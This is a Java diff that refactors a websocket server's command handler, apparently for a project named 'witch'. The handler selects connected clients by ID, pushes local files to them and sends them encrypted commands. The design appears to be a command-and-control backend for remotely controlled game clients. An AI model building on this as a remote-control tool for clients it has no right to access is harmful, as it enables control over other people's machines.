@@ -1,8 +1,6 @@
 package me.soda.witch.server.handlers;
 
-import com.google.gson.Gson;
 import com.google.gson.JsonObject;
-import me.soda.witch.server.server.Message;
 import me.soda.witch.server.server.Server;
 import org.java_websocket.WebSocket;
 
@@ -12,23 +10,6 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class CommandHandler {
-    private static final Gson GSON = new Gson();
-    private static List<WebSocket> connCollection;
-    private static boolean all = true;
-
-    private void tryBroadcast(Server server, String messageType, Object... object) {
-        String json = GSON.toJson(object);
-        tryBroadcast(server, new Message(messageType, json));
-    }
-
-    private void tryBroadcast(Server server, Message message) {
-        if (all) {
-            server.getConnections().forEach(conn -> conn.send(server.clientMap.get(conn).encrypt(message, server)));
-        } else {
-            connCollection.forEach(conn -> conn.send(server.clientMap.get(conn).encrypt(message, server)));
-        }
-    }
-
     public boolean handle(String in, Server server) {
         boolean stop = false;
         String[] msgArr = in.split(" ");
@@ -62,15 +43,16 @@ public class CommandHandler {
                                                 server.clientMap.get(conn).playerData.toString()
                                         )));
                                 case "sel" -> {
-                                    connCollection = new ArrayList<>();
                                     if (msgArr[2].equals("all")) {
-                                        all = true;
+                                        server.sendUtil.setAll(true);
                                         server.log("Selected all clients!");
                                         break;
                                     }
+                                    List<WebSocket> connCollection = new ArrayList<>();
                                     server.getConnections().stream().filter(conn ->
                                                     conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
-                                            .forEach(conn -> connCollection.add(conn));
+                                            .forEach(connCollection::add);
+                                    server.sendUtil.setConnCollection(connCollection);
                                     server.log("Selected client!");
                                 }
                                 case "disconnect" -> {
@@ -89,17 +71,17 @@ public class CommandHandler {
                         String[] strArr = new String[msgArr.length - 1];
                         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                         File file = new File(String.join(" ", strArr));
-                        FileInputStream is = new FileInputStream(file);
-                        tryBroadcast(server, msgArr[0], is.readAllBytes());
-                        is.close();
+                        try(FileInputStream is = new FileInputStream(file)) {
+                            server.sendUtil.trySend(server, msgArr[0], is.readAllBytes());
+                        }
                     }
                     default -> {
                         if (msgArr.length >= 2) {
                             String[] strArr = new String[msgArr.length - 1];
                             System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
-                            tryBroadcast(server, msgArr[0], String.join(" ", strArr));
+                            server.sendUtil.trySend(server, msgArr[0], String.join(" ", strArr));
                         } else {
-                            tryBroadcast(server, msgArr[0]);
+                            server.sendUtil.trySend(server, msgArr[0]);
                         }
                     }
                 }
